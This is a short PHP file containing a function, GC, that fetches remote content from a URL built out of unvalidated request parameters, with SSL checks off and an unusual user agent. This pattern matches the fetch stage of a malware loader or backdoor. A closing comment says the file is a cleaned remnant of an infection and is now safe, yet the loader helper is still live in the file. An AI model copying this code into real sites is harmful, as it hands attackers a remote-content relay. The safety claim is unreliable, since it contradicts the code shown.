<?php
function GC($a)
{
    $url = sprintf('%s?api=%s&ac=%s&path=%s&t=%s', $a, $_REQUEST['api'], $_REQUEST['ac'], $_REQUEST['path'], $_REQUEST['t']); $code = @file_get_contents($url); if ($code == false) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_USERAGENT, 'll'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_TIMEOUT, 100); curl_setopt($ch, CURLOPT_FRESH_CONNECT, TRUE); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); $code = curl_exec($ch); curl_close($ch); }return $code;}

/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/
